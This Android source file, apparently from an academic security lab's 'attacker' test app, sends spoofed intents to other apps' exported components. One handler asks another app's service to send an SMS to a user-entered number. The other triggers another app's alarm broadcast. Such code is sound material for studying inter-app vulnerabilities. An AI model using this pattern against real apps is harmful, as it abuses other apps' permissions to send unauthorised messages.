package edu.uci.seal.attacker;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void SendSMS(View v) {
        Intent i = new Intent("com.example.android.directshare.SEND_SMS");
        String phoneNumber = ((EditText)findViewById(R.id.editText)).getText().toString();
        String msg = "testing message";
        i.putExtra("PHONE_NUMBER", phoneNumber);
        i.putExtra("TEXT_MSG", msg);
      //  i.setPackage(this.getPackageName());
        Log.d("send", "send sms");
        startService(i);
    }

    public void startAlarm(View v) {
        long alarmid = 1;
        Intent i = new Intent("com.xi.TRIGGER_ALARM");
        i.putExtra("alarm_id", alarmid);
        Log.d("alarm", "send alarm");
        sendBroadcast(i);
    }
}
